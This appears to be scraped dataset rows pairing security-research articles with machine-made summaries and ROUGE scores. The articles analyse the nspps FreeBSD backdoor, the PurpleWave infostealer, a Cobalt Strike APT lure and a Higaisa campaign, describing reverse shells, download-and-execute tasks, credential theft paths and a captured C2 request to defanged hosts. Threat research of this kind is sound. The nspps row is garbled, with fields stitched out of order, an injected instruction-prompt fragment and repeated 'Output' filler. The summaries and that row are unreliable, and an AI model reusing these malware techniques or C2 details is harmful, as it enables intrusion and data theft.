would be the random SOCKS5 server pass authentication valueNNNNN would be the random SOCKS5 server TCP port being usedShould this SOCKS5 initial ""POST"" connection be unsuccessful, it will be retried in a loop, with a ""time.Sleep"" call imposing a delay of 20 seconds between retries.Command and Control (C2) Protocol SummaryFrom ""nspps"" to C2 Server Request/Meaning Format of Output Data Format of Response from C2 Server GET /h Health/Connectivity Check HTTP request and headers, no data payload success: status code 200 (""OK"") no other status specified in code GET /get Fetch the next ""task"" from C2 server HTTP request and headers, no data payload no tasks: status code 404 (""Not found"") otherwise: there's tasking... tasking data is decrypted and unmarshalled via RC4 + JSON POST /getT Fetch the target list from C2 server JSON + RC4 Unsure on content, but there is data, possibly to request targeting as required for specific tasks no targets: status code 404 (""Not found"") otherwise: there's a target list... target list is decrypted and unmarshalled via RC4 + JSONfurther parsing indicates that targets will be tagged as either... "" ip "", "" cidr "", or "" url ""POST /l Send log data to C2 server RC4 only (no JSON) ASCII text log messages success: status code 200 (""OK"") no other status specified in code POST /o Send Exec output to C2 server JSON + RC4 Output data from tasks success: status code 200 (""OK"") no other status specified in code POST /r Send results from task processing to C2 server JSON + RC4 Result data from tasks success: status code 200 (""OK"") no other status specified in code POST /s Send new SOCKS5 server's user/pass/TCP port to C2 server JSON + RC4 SOCKS5 server auth details success: status code 200 (""OK"") no other status specified in codeSupported TasksAs mentioned above in ""Initial C2 Callouts"", ""nspps"" sends ""GET /get"" requests to its connected C2 server, asking for work.If there is work available, the C2 server responds with a non-404 status code and a JSON-marshalled and RC4-encrypted data buffer containing a task string and parameters for the task's execution.While purely static analysis (translation: lack of data from the C2 server side) doesn't provide us a 100% full understanding of every aspect of certain particular tasks at this time, here is an overview of each of the supported tasks found within ""nspps"", and the corresponding functionality of that task...Task String Handler Function within ""main"" Package That Implements/Performs the Task backconnect ""main.backconnect"": starts a new goroutine at ""main.backconnect_func1""... Summary: Reverse shellopens a TCP connection to the supplied network addressprepares a ""/bin/sh"" command instance, connecting the stdin/stdout/stderr and TCP connection file descriptor readers/writersruns the ""/bin/sh"" command synchronously, and waits for its completion download_and_exec ""main.downloadAndExecute"": starts a new goroutine at ""main.downloadAndExecute_func1""... Summary: File download and execute with outputs returneda filename for the downloaded content is generated within the writable directory, using a randomly generated 5-character string composed of ASCII characters from the range ""[A-Za-z]""downloads the file using the passed URL via HTTP "" GET "" request"" request makes the downloaded file executable via ""chmod +x""executes the downloaded file directly by pathnameoutput from the command is marshalled (JSON) and encrypted (RC4)"" POST /o "" request sends the data to the C2 server"" request sends the data to the C2 server a successful response from the C2 server is status code 200 (""OK"") exec ""main.execTask"": runs the supplied command directly, with no resultant output collected Summary: Command execution (asynchronous: ""fire and forget"")prepares the command using the supplied command and argumentscommand is issued asynchronously (i.e. no wait for completion or results) exec_output ""main.execTaskOut"": starts a new goroutine at ""main.execTaskOut_func1""... Summary: Command execution with outputs returnedruns the supplied command directlyoutput from the command is marshalled (JSON) and encrypted (RC4)"" POST /o "" request sends the data to the C2 server"" request sends the data to the C2 server a successful response from the C2 server is status code 200 (""OK"")masscan ""main.masscan"" handles this one... Summary: Execute (download, if needed) ""Masscan"" protocol scanner w/results returnedgets the current target list from the C2 server via "" POST /getT "" request"" request a filename for the target list is generated within the current directory, using a randomly generated 6-character string composed of ASCII characters from the range ""[A-Za-z]"", appended with a "".txt"" file suffixwrites the target list into the new file, using """" as a line separatora filename for the ""firewire.sh"" results is generated within the current directory, using a randomly generated 6-character string composed of ASCII characters from the range ""[A-Za-z]"", appended with a "".txt"" file suffixwrites the ""firewire.sh"" script file to the current directorymakes ""firewire.sh"" executable via ""chmod +x""prepares and executes ""firewire.sh"" with the passed command line parametersdeletes the ""firewire.sh"" script filedeletes the target list filereads the output results file onto the queue for shipment to the C2 serverdeletes the output results filenote: queued results are handled by the resident goroutine ""main.resultSender""... results are pulled off the queue and marshalled (JSON) and encrypted (RC4) "" POST /r "" request sends the data to the C2 server a successful response from the C2 server is status code 200 (""OK"")redis_brute ""main.runTask"": implements multiple, concurrent instances of ""main.redisBrute"" Summary: An authentication brute force targeting Redis 13 deployments that have their authentication layer enabled, and configured with an associated token or password.gets the current target list from the C2 server via "" POST /getT "" request"" request sets up associated Go channels and goroutines to run ""main.redisBrute"" function. Each instance... opens a TCP connection to the next target network address loops through a passed set of strings... builds and sends "" AUT H "" + the next string + """" over the connection if "" Client sent AUTH, but no password is set "" is contained within the response text, the authentication layer is likely not enabled within the target Redis instance, and this ""main.redisBrute"" instance is completed. if an "" OK "" is found within the response text, indication of this success is placed in the results queue for shipment to the C2 server, and this ""main.redisBrute"" instance is completed. otherwise, the AUTH attempt is repeated, using the next string in sequence... if the loop completes, this ""main.redisBrute"" instance is completed. note: queued results are handled by the resident goroutine ""main.resultSender""... results are pulled off the queue and marshalled (JSON) and encrypted (RC4) "" POST /r "" request sends the data to the C2 server a successful response from the C2 server is status code 200 (""OK"")request ""main_runTaskWithHttp"": implements multiple, concurrent instances of ""main.request"" Summary: This appears to be an HTTP ""GET"" scan of specified network endpoints (likely URLs), with response matches against specified values being forwarded back to the C2 server as results. Unsure of use case at this point: could be ""bannering"", or for specific protocol scanning.gets the current target list from the C2 server via "" POST /getT "" request"" request sets up associated Go channels and goroutines of the ""main.taskWithHttpWorker"" function, each running the""main.request"" functioneach ""main.request"" function instance... parses the passed in data, requiring the keys "" template "", "" method "", "" contentType "" and "" requestBody "" to be present before continuing further generates and sets a new "" GET "" request to the next target network address/URL parses the response data, looking for matches of one of the passed in values within several specific keyed value fields. The response data fields checked, in order, are... "" bodyContains "" "" bodyEquals "" "" headerContains "" "" statusAndBodyContains "" if the contents of any of those value fields contain the corresponding passed in value, that value field is placed in the results queue for shipment to the C2 server, and the function returnsnote: queued results are handled by the resident goroutine ""main.resultSender""... results are pulled off the queue and marshalled (JSON) and encrypted (RC4) "" POST /r "" request sends the data to the C2 server a successful response from the C2 server is status code 200 (""OK"")scan ""main.runTaskWithScan"": implements multiple, concurrent instances of ""main.taskScan"" Summary: This appears to be a TCP connectivity scan of specified network endpoints (IP address + TCP port), followed by running specified tasks against those network endpoints and/or other specified targets that responded to the initial scan.sets up associated Go channels and goroutines of the ""main.taskWithScanWorker"" function, each running the""main.taskScan"" functioneach ""main.taskScan"" function instance... opens a TCP connection to the next target network address if an error occurred on the connection attempt, and the error string contains the text "" too many open files "", ""main.taskScan"" sleeps for a passed time interval, and then calls itself recursively with the same arguments, apparently to retry the connection if the connection succeeded, close the connection, and the network endpoint address info is placed in the results queue for shipment to the C2 serverthen the task runner... gets the next task to be performed from the C2 server via "" GET /get "" request gets the target list for the task from the C2 server via "" POST /getT "" request for each target in the target list, calls back to the ""main.doTask"" function to fire off the task for each target in the target listnote: queued results are handled by the resident goroutine ""main.resultSender""... results are pulled off the queue and marshalled (JSON) and encrypted (RC4) "" POST /r "" request sends the data to the C2 server a successful response from the C2 server is status code 200 (""OK"")socks ""main.socks"": starts a new goroutine at ""main.socks_func1""... Summary: Appears to start a new, dedicated TLSed and Yamux-multiplexed SOCKS5 server, connected to the passed network address.Sequence appears to roughly be... generate a new, default SOCKS5 ""Server"" data structure establish a new TLS TCP connection to the passed network address, via ""crypto/tls.Dial"" stands up a new Yamux (""Yet Another Multiplexor"") Server on the TLS TCP connection enters a loop... starts a Yamux Session Accept on the TLS TCP connect to block, awaiting the next incoming Yamux stream to be accepted when a new stream connects... start a new goroutine at ""main.connectForSocks_func1"", which calls the SOCKS5 ""ServeConn"" function, to serve the new Yamux stream as a SOCKS5 connection go back to the top of the loop, to perform another Yamux Session Accept, awaiting the next incoming Yamux streamhttps://redis.io/topics/introduction, ""Introduction to Redis"", sponsored by RedisLabs.tcp ""main.runTask"": implements multiple, concurrent instances of the ""main.tcpTask"" function... Summary: Appears to be a method for accepting hex encoded strings, sending their decoded ""payload"" to designated targets for execution, with read and relay of results from the target back to the C2 server.gets the current target list from the C2 server via "" POST /getT "" request"" reques";"nspps is a backdoor written in Go (a.k.a. ""golang"") for use upon FreeBSD targets. ""nspps"" is a malware that uses a SOCKS5 server to connect to the target's available network interfaces. It uses a random TCP port number generated between the values 30000 and 32000 (inclusive), as well as 8byte randomly generated ""user"" and 8byte randomly generated ""pass"" values, for use in authentication to the SOCKS5 server. During multiple runs, on 2 different FreeBSD platforms (8.4 and 12.1), ""nspps"" produced the same ""random"" values for the SOCKS5 TCP port number, ""user"" and ""pass"" values. ""nspps"" uses functions in Go's ""math/rand"" package for pseudorandom number generation (PRNG), whose documentation mentions ""Random numbers are generated by a Source. Toplevel functions, such as Float64 and Int, use a default shared Source that produces a deterministic sequence of values each time a program is run. The report is summarized as follows: 1. Toplevel functions, such as Float64 and Int, use a default shared Source that produces a d eterministic sequence of values each time a program is run. 2. Use the Seed function to initialize the default Source if different behavior is required for each run. 3. ""8These SOCKS5 ""random"" values are generated in the ""main.main"" function during ""nspps"" startup, using ""main"" package functions that wrap calls to ""math/rand"" Go functions...the ""user"" and ""pass"" values are both produced by a call to ""main.RandStringRunes"", which in turn also invokes ""math/rand.Intn"", which is documented, in part, as ""returns, as an int, a nonnegative pseudorandom number in [0,n) from the default Source"" 4. The TCP port value is obtained through a call to ""main.randIntRange"", which then also calls ""math/rand.Intn"", which is documented, in part, as ""returns, as an int, a nonnegative pseudorandom number in [0,n) from the default Source"" 5. Curiously, the ""user"", ""pass"" and TCP port ""random"" values returned from the unseeded Go PRNG may be constant for every instance of this ""nspps"" binary that's deployed. 6. Data payloads, with the exception of log messages, exchanged between the ""nspps"" client and its C2 server(s) are marshalled and obfuscated before sending by...Marshalling into JSON via the encoding/json.Marshall function, thenfunction, then ENcrypting with RC4 via the Go function crypto/RC4.Cipher_X The script should run on both Linux and FreeBSD platforms, though it contains a bit of Linuxcentric content within. When executed on a Red Hat or Debianbased Linux platform, the utility pairs ""rpm"" and ""yum"" (Red Hat) or ""dpkgquery"" and ""aptget"" (Debian) will be used to confirm that the ""libpcapdev"" package is installed, and try to install if not. No real error handling for the installation commands is done on a platform where they might not exist, so a FreeBSD platform would fall through and continue to process the script, accordingly. The remainder of the script should be more platform agnostic. The ITSecurity report states that no real error handling for the installation commands is done on a platform where they might not exist, so a FreeBSD platform would fall through and continue to process the script, accordingly. The remainder of the script should be more platform agnostic. Lines 3148 try to find the file ""firewire"" in its current working directory, and verify that it matches the MD5: 45a7ef83238f5244738bb5e7e3dd6299. If either the ""md5sum"" command is not available, or the output of the ""md5sum"" command does not contain the desired MD5, an attempt is made to download a copy of the file ""firewire"" from the Internet address/URL contained in the ""$MASSCAN"" variable (assigned from script input parameter ""$5"" at line 7). This is tried first with ""curl"", and then ""wget"", if ""curl"" was unsuccessful for any reason. Lastly, ""chmod"" is used to make ""firewire"" executable. Finally, ""firewire"" is executed at line 50, using the ""$PORT"", ""$RATE"", ""$INPUT"", and ""$OUTPUT"" variables (all assigned in lines 36 from script input parameters ""$1"", ""$2"", ""$3"", and ""$4"", respectively) to form its command line parameters. Note that if the attempt at execution fails, the script assumes that to be due to insufficient privilege level of the current user, and a second execution of ""firewire"" is attempted at line 56 using ""sudo"", which will try to execute the command as the system's superuser, or ""root"". HTTP/1.1 200 OK\rContentType: text/plain\r\nContentLength: 10\r\n\r\n ### Instruction: Summarize the ITSecurity report ### Input: The MD5 45a7ef83238f5244738bb5e7e3dd6299 mentioned in ""firewire.sh"" is found within VirusTotal10, and the exported symbols listed there are all found within source code for the ""Masscan: Mass IP port scanner"", which professes itself to be ""an Internetscale port It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second, from a single machine""11, publicly available at hxxps://github[.]com/robertdavidgraham/masscan. The ""firewire"" commandline parameters invoked in ""firewire.sh"" are also found documented as among those in ""masscan""....we believe ""firewire"" == ""Masscan"".It's likely that ""firewire"" is used for any requisite port scanning to be performed within victim network space, and given the ""fire"" in ""firewire"" coupled with the indicated highperformance capability of the scanner, it may also be a vehicle used to conduct denial of service attacks in target space.Initial C2 CalloutsFollowing ""nspps"" startup on a lab FreeBSD 8.4 target, there were three initial connections attempted to its C2 endpoint(s). There appears to be a notion of a ""current C2 server"" within ""nspps"", effectively being the most recent C2 server to which it has successfully connected and exchanged data. At program startup, the The C2 server check will attempt to repetitively contact each of its 3 embedded addresses...hxxp://188[.]120[.]254[.]224hxxp://46[.]229[.]215[.]164hxxp://62[.]113[.]112[. ]127...in turn, using the first one which successfully responds with a status code 200 (""OK"") as its current C2 server. Between ""health check"" attempts, ""main.healthChecker"" will issue a ""time.Sleep"" call, pausing for 60 seconds before the next connection attempt. ""nspps"" sends a ""GET /get"" request to its current C2 server, as a ""task"" fetch, checking to see if there's any queued tasking/processing to be performed on target...GET /get HTTP/1.1\rHost: 188[.]120[.]254[. ]224\rUserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\rArch: amd64\rCores: 1\rMem: 2031\rOs: freebsd\rOsname: freebsd\rOsversion: 8.4release\rRoot: true\rUuid: 8ec35f4d03dd48087c6e3f8e6096b32 Output Output Output Output Output Output: ## The output The output. . [12. HTTP/1.1 200 OK";en;{'r': 0.2934984520123839, 'p': 0.9221789883268483, 'f': 0.4452794702686139};{'r': 0.22299449753837242, 'p': 0.8690744920993227, 'f': 0.3549204853418592};{'r': 0.2934984520123839, 'p': 0.9221789883268483, 'f': 0.4452794702686139}
https://www.zscaler.com/blogs/security-research/purplewave-new-infostealer-russia;PurpleWave—A New Infostealer from Russia;"Infostealer is one of the most profitable tools for cybercriminals, as information gathered from systems infected with this malware could be sold in the cybercrime underground or used for credential stuffing attacks. The Zscaler ThreatLabZ team came across a new Infostealer called PurpleWave, which is written in C++ and silently installs itself onto a user's system. It connects to a command and control (C&C) server to send system information and installs new malware onto the infected system.The author of this malware is advertising and selling PurpleWave stealer on Russian cybercrime forums for 5,000 RUB (US$68) with lifetime updates and 4,000 RUB (US$54) with only two updates.Figure 1: A PurpleWave selling post on a Russian forum.The author selling PurpleWave claims that this stealer is capable of stealing passwords, cookies, cards, and autofill forms of Chromium and Mozilla browsers. This stealer also collects files from the specified path, takes screenshots, and installs additional modules.The capabilities of the PurpleWave stealer include:Stealing passwords, cookies, cards, autofill(s) data, browser history from Chromium and Mozilla.Collecting files from the specified pathCapturing the screenStealing system informationStealing Telegram session filesStealing Steam application dataStealing Electrum wallet dataLoading and executing additional module/malwareFigure 2: The PurpleWave login panel.The author also built a dashboard where the attacker can keep an eye on the infection counts according to dates, access the stolen logs of infected machines, and change the malware configuration settings.Figure 3: The PurpleWave infection dashboard.The dashboard also provides the attacker with the ability to customize the configuration of the PurpleWave stealer.Figure 4: The dashboard for customizing the PurpleWave configuration.Technical analysisUpon execution of the PurpleWave binary, it gives a fake error message in the Russian language that can be customized by the attacker in their panel. But in the background, it performs all of its malicious activities.Figure 5: The fake error message in Russian. (It translates to: Memory control blocks damaged.)The name of the stealer (PurpleWave) and the version (1.0) are hardcoded and encrypted in the binary. Most of the strings in the binary are encrypted, but they get decrypted on runtime with the help of the decryption loop present in the binary (shown in Figure 6).Figure 6: The common decryption function for the encrypted strings in the binary.The PurpleWave binary creates a mutex with the name ""MutexCantRepeatThis"" to avoid multiple executions of malware instances. After that, it sends the HTTP POST request with the custom header and body to the C&C URL to get the configuration data.Figure 7: Sending request to the C&C server to get the config data.It creates an HTTP request header with content type as ""form-data"". The boundary is assigned with ""boundaryaswell"" to act as a marker and user agent is set with ""app"". It creates a request body with a form name as ""id"" and the value assigned to it is 1.Figure 8: The configuration request with the custom header and body.The received data contains the customized configuration, which may change per the binary. We have observed three different configurations and different hosts of the PurpleWave binaries.Figure 9: The configuration from different PurpleWave binaries.dirs - It consists of directory information from which files to be collected.fake - It has the fake alert message to be shown to the user on execution.loaders - It consists of an additional module name to be installed on the infected system.For Config-2, PurpleWave will traverse path ""%userprofile%/Desktop"" and collect the files having extensions txt, doc and docx. In Config-3, it will not collect any files but it has a module named ""Kv2TDW4O"" in the loaders, which will get downloaded and executed on the system.Installing additional modulesFor installing additional modules mentioned in the received configuration (Config-3), PurpleWave again creates an HTTP POST request with the same headers mentioned in the previous request to the C&C host followed by ""/loader/module_name"".Figure 10: The request to download an additional module.PurpleWave enumerates the loaders list from a JSON configuration, downloads the module name from the C&C server and stores it in %appdata% directory, then executes it.Figure 11: Downloading and executing additional modules.The downloaded module that we observed in some PurpleWave binary is the Electrum wallet stealer, which is written in .NET and capable of stealing Electrum wallet data from the infected system.Figure 12: Collecting Electrum wallet data.Data stealingPurpleWave is capable of stealing credentials, autofills data, card data, cookies, and browser history from Chromium and Mozilla.For Chromium browsers, it fetches the login credentials from ""\%AppData%\Local\{Browser}\User Data\Default\Login Data"", cookies from ""\%AppData%\Local\{Browser}\User Data\Default\Cookies"", and other information, such as autofills data, card data, and browser history, from ""\%AppData%\Local\{Browser}\User Data\Default\Web Data"".Figure 13: Stealing browser data.The stolen browser info is collected in the form of a form-data field with the names shown below followed by their value.Username - browser[BrowserName][passwords][index][login]Password - browser[BrowserName][passwords][index][password]Figure 14: Stolen browser information.Along with the browser's data, the stealer captures the current screen and appends it to the browser's stolen data in the form-data with the filename as ""screenshot.png"".Figure 15: A captured screenshot.After that, it collects all the information about infected systems, such as operating system, CPU info, GPU info, machine GUID, username, machine name, and more.Figure 16: The system information collected by PurpleWave.The stealer also collects the SSFN files from the Steam application. The Steam application is used for playing, discussing, and creating games. The SSFN file exists to verify the users each time they login to their Steam account. It fetches the Steam path from the registry ""Software\\Valve\\Steam"" and reads all the SSFN files stored into the config directory.PurpleWave also steals session-related files from the Telegram application. It reads the value of the default key in the system registry branch ""HKCU\Software\Classes\tdesktop.tg\DefaultIcon"" to obtain a path of Telegram and collects all the files starts with ""map"" in the ""D877F783D5D3EF8C"" directory.Figure 17: Collecting Steam and Telegram data.PurpleWave merges all the collected file data, browser data, screenshots, Steam data, Telegram data, and system info, then sends it to a C&C server using an HTTP POST request.Figure 18: Sending stolen data to C&C serverCoverageThe observed indicators in this attack were successfully blocked by the Zscaler Cloud Sandbox.Figure 19: The Zscaler Cloud Sandbox report for PurpleWave.In addition to sandbox detections, Zscaler's multilayered cloud security platform detects indicators at various levels. The following advanced threat protection signatures have been released for detecting the malware:Win32.PWS.PurpleWaveConclusionZscaler believes that PurpleWave represents an active and ongoing threat, as the C&C servers are still alive and responding as of this writing. The malware also still appears to be available for purchase on the black market. PurpleWave has incredible potential to steal sensitive information. The malware is in the early stages of development, with the author likely to enhance its stealing capabilities and add more features. We will continue to keep track of this threat to ensure coverage.MITRE ATT&CK (tm) tactic and technique mappingTactic TechniqueT1083 File and directory discoveryT1082 System information discoveryT1033 System user discoveryT1124 System time discoveryT1016 System network configuration discoveryT1020 Automated exfiltrationT1041 Exfiltration over C&C channelT1071 Uses web protocolsT1105 Downloads additional filesT1555 Credentials from web browsersT1539 Steal web session cookiesT1005 Data from local systemT1113 Screen captureIndicators of Compromise (IOCs)HashesB18BCB300AE480B16A0E0B9110E1C06CD8A36DCE73E91780B52B6F387C5CFD789E4D3F4439ED39C01F3346FBDB7488AE657C3DDAFF433067C7F74F3453C7EB37E770544551F94296B9A867E42435206FE23DED17CDF532790F708E8A550969EBBC693652D5F57E792551C3A62049BA0BB5FB35BE12C66F16F55AF2C2ABC77E55AD24A6614C528DE81283FE4A618682C7AC17A56355914E231B2AD52E45D6F7797A728F42940F5BCB50AC9A5C57C1D36153BC8E68A9028C58941B78E4AD867B83394298EED78D455416E1E4CF0DEB480230898909FD4BF93FE23C62E6962BED1102350FFA6B82CD2079797ED4BA1DD2400212EB9562992DA05AB28EFFB9D64D8A01C8D886BD213F983D0FD5AD35D78A9AURLssh1213709[.]a[.]had[.]su/configsh1213709[.]a[.]had[.]su/gatesh1213709[.]a[.]had[.]su/loader/Kv2TDW4Osh1213709[.]a[.]had[.]su/loader/9ZNzBRpTsh1213709[.]a[.]had[.]su/loader/Ds5UabYTsh1213709[.]a[.]had[.]su/loader/MTIQK8lVmanget6z[.]beget[.]tech/configmanget6z[.]beget[.]tech/gateec2-3-134-252-78[.]us-east-2[.]compute[.]amazonaws[.]com/configec2-3-134-252-78[.]us-east-2[.]compute[.]amazonaws[.]com/gatebibaiboba[.]beget[.]tech/configbibaiboba[.]beget[.]tech/gatesumakokl[.]beget[.]tech/configsumakokl[.]beget[.]tech/gateikaschyn[.]beget[.]tech/configikaschyn[.]beget[.]tech/gateh98801x4[.]beget[.]tech/configh98801x4[.]beget[.]tech/gate";The PurpleWave stealer is capable of stealing passwords, cookies, cards, autofill(s) data, browser history from Chromium and Mozilla. It also collects files from the specified path, takes screenshots, and installs additional modules. It also provides the attacker with the ability to customize the configuration of the PurpleWave stealer. Zscaler's multilayered cloud security platform detects indicators at various levels. The Zscaler Cloud Sandbox report for PurpleWave.;en;{'r': 0.09811320754716982, 'p': 1.0, 'f': 0.17869415644831785};{'r': 0.05466540999057493, 'p': 0.9354838709677419, 'f': 0.10329474517227025};{'r': 0.09811320754716982, 'p': 1.0, 'f': 0.17869415644831785}
https://www.malwarebytes.com/blog/news/2020/06/multi-stage-apt-attack-drops-cobalt-strike-using-malleable-c2-feature;Multi-stage APT attack drops Cobalt Strike using Malleable C2 feature;"Posted: June 17, 2020 byA newly discovered APT spear-phishing attack implements several evasion techniques to drop Cobalt Strike toolkit.This blog post was authored by Hossein Jazi and Jerome SeguraOn June 10, we found a malicious Word document disguised as a resume that uses template injection to drop a .Net Loader. This is the first part of a multi-stage attack that we believe is associated to an APT attack. In the last stage, the threat actors used Cobalt Strike's Malleable C2 feature to download the final payload and perform C2 communications.This attack is particularly clever for its evasion techniques. For instance, we observed an intentional delay in executing the payload from the malicious Word macro. The goal is not to compromise the victim right away, but instead to wait until they restart their machine. Additionally, by hiding shellcode within an innocuous JavaScript and loading it without touching the disk, this APT group can further thwart detection from security products.Lure with delayed code executionThe lure document was probably distributed through spear phishing emails as a resume from a person allegedly named ""Anadia Waleed."" At first, we believed it was targeting India but it is possible that the intended victims could be more widespread.Figure 1: ResumeThe malicious document uses template injection to download a remote template from the following url:https://yenile[.]asia/YOOMANHOWYOUDARE/indexb.dotmFigure 2: Template injectionThe domain used to host the remote template was registered on February 29, 2020 by someone from Hong Kong. Creation time for the document is 15 days after this domain registration.The downloaded template, ""indexa.dotm"", has an embedded macro with five functions:Document_OpenVBA_and_ReplaceBase64DecodeChangeFontSizeFileFolderExist.The following shows the function graph of the embedded macro.Figure 3: Macro functions graphThe main function is Document_open which is executed upon opening the file. This function drops three files into the victim's machine:Ecmd.exe : UserForm1 and UserForm2 contain two Base64 encoded payloads. Depending on the version of .Net framework installed on the victim's machine, the content of UserForm1 (in case of .Net v3.5) or UserForm2 (other versions) is decoded and stored in ""C:\ProgramData"".: UserForm1 and UserForm2 contain two Base64 encoded payloads. Depending on the version of .Net framework installed on the victim's machine, the content of UserForm1 (in case of .Net v3.5) or UserForm2 (other versions) is decoded and stored in ""C:\ProgramData"". cf.ini : The content of the ""cf.ini"" file is extracted from UserForm3 and is AES encrypted, which later on is decrypted by ecmd.exe.: The content of the ""cf.ini"" file is extracted from UserForm3 and is AES encrypted, which later on is decrypted by ecmd.exe. ecmd.exe.lnk: This is a shortcut file for ""ecmd.exe"" and is created after Base64 decoding the content of UserForm4. This file is dropped in the Startup directory as a trigger and persistence mechanism.Ecmd.exe is not executed until after the machine reboots.Figure 4: Document_OpenFigure 5: Custom Base64 decode functionChangeFontSize and VBA_and_Replace functions are not malicious and probably have been copied from public resources [1, 2] to mislead static scanners.Intermediary loaderEcmd.exe is a .Net executable that pretends to be an ESET command line utility. The following images show the binary certificates, debugger and version information.The executable has been signed with an invalid certificate to mimic ESET, and its version information shows that this is an ""ESET command line interface"" tool (Figure 6-8).Figure 6: Certificate informationFigure 7: Version informationFigure 8: Debugger informationecmd.exe is a small loader that decrypts and executes the AES encrypted cf.ini file mentioned earlier. It checks the country of the victim's machine by making a HTTP post request to ""http://ip-api.com/xml"". It then parses the XML response and extracts the country code.Figure 9: Getcon function: make http post request to ""ip-api.com""Figure 10: ip-api.com outputIf the country code is ""RU"" or ""US"" it exits, otherwise it starts decrypting the content of ""cf.ini"" using a hard-coded key and IV pair.Figure 10: ecmd.exe main functionThe decrypted content is copied to an allocated memory region and executed as a new thread using VirtualAlloc and CreateThread APIs.Figure 11: runn functionShellCode (cf.ini)A Malleable C2 is a way for an attacker to blend in command and control traffic (beacons between victim and server) with the goal of avoiding detection. A custom profile can be created for each target.The shell code uses the Cobalt Strike Malleable C2 feature with a jquery Malleable C2 profile to download the second payload from ""time.updateeset[.]com"".Figure 12: Malleable C2 requestThis technique has been used by two other recent Chinese APTs--Mustang Panda and APT41.The shellcode first finds the address of ntdll.exe using PEB and then calls LoadLibrayExA to load Winint.dll. It then uses InternetOpenA, InternetConnectA, HttpOpenRequestA, InternetSetOptionA and HttpSendRequestA APIs to download the second payload.The API calls are resolved within two loops and then executed using a jump to the address of the resolved API call.Figure 13: Building API callsThe malicious payload is downloaded by InternetReadFile and is copied to an allocated memory region.Figure 14: InternetReadFileConsidering that communication is over HTTPS, Wireshark is not helpful to spot the malicious payload. Fiddler was not able to give us the payload either:Figure 15: Fiddler outputUsing Burp Suite proxy we were able to successfully verify and capture the correct payload downloaded from time.updateeset[.]com/jquery-3.3.1.slim.min.js. As can be seen in Figure 16, the payload is included in the jQuery script returned in the HTTP response:Figure 16: Payload happened to the end of jqueryAfter copying the payload into a buffer in memory, the shellcode jumps to the start of the buffer and continues execution. This includes sending continuous beaconing requests to ""time.updateeset[.]com/jquery-3.3.1.min.js"" and waiting for the potential commands from the C2.Figure 17: C2 communicationsUsing Hollow Hunter we were able to extract the final payload which is Cobalt Strike from ecmd's memory space.AttributionA precise attribution of this attack is a work in progress but here we provide some insights into who might be behind this attack. Our analysis showed that the attackers excluded Russia and the US. The former could be a false flag, while the latter may be an effort to avoid the attention of US malware analysts.As mentioned before, the domain hosting the remote template is registered in Hong Kong while the C2 domain ""time.updateeset[.]com"" was registered under the name of an Iranian company called Ehtesham Rayan on Feb 29, 2020. The company used to provide AV software and is seemingly closed now. However, these are not strong or reliable indicators for attribution.Figure 11: updateeset.com whois registration informationIn terms of TTPs used, Chinese APT groups such as Mustang Panda and APT41 are known to use jQuery and the Malleable C2 feature of Cobalt Strike. Specifically, the latest campaign of Mustang Panda has used the same Cobalt Strike feature with the same jQuery profile to download the final payload which is also Cobalt Strike. This is very similar to what we saw in this campaign, however the initial infection vector and first payload are different in our case.IOCsAnadia Waleed resume.doc259632b416b4b869fc6dc2d93d2b822dedf6526c0fa57723ad5c326a92d30621Remote Template: indexa.dotm7f1325c5a9266e649743ba714d02c819a8bfc7fd58d58e28a2b123ea260c0ce2Remote Template Url:https://yenile[.]asia/YOOMANHOWYOUDARE/C2:time.updateeset[.]comEcmd.exe:aeb4c3ff5b5a62f5b7fcb1f958885f76795ee792c12244cee7e36d9050cfb298dcaaffea947152eab6572ae61d7a3783e6137901662e6b5b5cad82bffb5d89955f49a47abc8e8d19bd5ed3625f28561ef584b1a226df09d45455fbf38c73a79ccf.ini:0eba651e5d54bd5bb502327daef6979de7e3eb63ba518756f659f373aa5f4f8bCf.ini shell-code after decryption:5143c5d8715cfc1e70e9db00184592c6cfbb4b9312ee02739d098cf6bc83eff9Cobalt Strike downloaded shellcode:8cfd023f1aa40774a9b6ef3dbdfb75dea10eb7f601c308f8837920417f1ed702Cobalt Strike payload7963ead16b6277e5b4fbd5d0b683593877d50a6ea7e64d2fc5def605eba1162a";"A newly discovered APT spearphishing attack implements several evasion techniques to drop Cobalt Strike toolkit. This blog post was authored by Hossein Jazi and Jerome Segura On June 10, we found a malicious Word document disguised as a resume that uses template injection to drop a .Net Loader. This is the first part of a multistage attack that we believe is associated to an APT attack. In the last stage, the threat actors used Cobalt Strike's Malleable C2 feature to download the final payload and perform C2 communications. Lure with delayed code execution The lure document was probably distributed through spear phishing emails as a resume from a person allegedly named ""Anadia Waleed."" At first, we believed it was targeting India but it is possible that the intended victims could be more widespread. Figure 1: Resume The malicious document uses template injection to download a remote template from the following url:https://yenile[. ]asia/YOOMANHOWYOUDARE/indexb.dotm Figure 2: Template injection The domain used to host the remote template was registered on February 29, 2020 by someone from Hong Kong. Creation time for the document is 15 days after this domain registration. The downloaded template, ""indexa.dotm"", has an embedded macro with five functions: Document_OpenVBA_and_ReplaceBase64DecodeChangeFontSizeFileFolderExist. The following shows the function graph of the embedded macro. Figure 3: Macro functions graph The main function is Document_open which is executed upon opening the file. This function drops three files into the victim's machine: Ecmd.exe : UserForm1 and UserForm2 contain two Base64 encoded payloads. Depending";en;{'r': 0.284452296819788, 'p': 0.9470588235294117, 'f': 0.437499996447454};{'r': 0.20870425321463898, 'p': 0.8791666666666667, 'f': 0.3373301327904583};{'r': 0.284452296819788, 'p': 0.9470588235294117, 'f': 0.437499996447454}
https://www.malwarebytes.com/blog/news/2020/06/higaisa;New LNK attack tied to Higaisa APT discovered;"Posted: June 4, 2020 byWe describe a new spearphishing campaign tied to the potential North Korean Higaisa APT group.This post was authored by Hossein Jazi and Jerome SeguraOn May 29th, we identified an attack that we believe is part of a new campaign from an Advanced Persistent Threat actor known as Higaisa. The Higaisa APT is believed to be tied to the Korean peninsula, and was first disclosed by Tencent Security Threat Intelligence Center in early 2019.The group's activities go back to at least 2016 and include the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Its targets include government officials and human rights organizations, as well as other entities related to North Korea.In this latest incident, Higaisa used a malicious shortcut file ultimately responsible for creating a multi-stage attack that consists of several malicious scripts, payloads and decoy PDF documents.DistributionThe threat actors used a malicious LNK file bundled within an archive file which was most likely distributed via spear-phishing.We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:""CV_Colliers.rar""""Project link and New copyright 